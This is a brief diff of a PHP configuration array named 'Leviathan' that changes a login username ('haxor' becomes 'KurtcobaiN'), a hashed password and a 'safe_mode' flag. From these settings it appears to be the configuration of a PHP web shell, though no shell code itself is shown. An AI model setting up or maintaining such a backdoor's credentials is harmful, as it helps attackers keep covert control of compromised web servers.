@@ -1,9 +1,9 @@
 <?php
 
 $GLOBALS['Leviathan'] = array(
-    'username' => 'haxor',
-    'password' => '7d793037a0760186574b0282f2f435e7',
-    'safe_mode' => '0',
+    'username' => 'KurtcobaiN',
+    'password' => 'cc707fc6c381dde2bb0f0f6a2cb455da',
+    'safe_mode' => '1',
     'login_page' => 'gui',
     'show_icons' => '1',
     'post_encryption' => true,
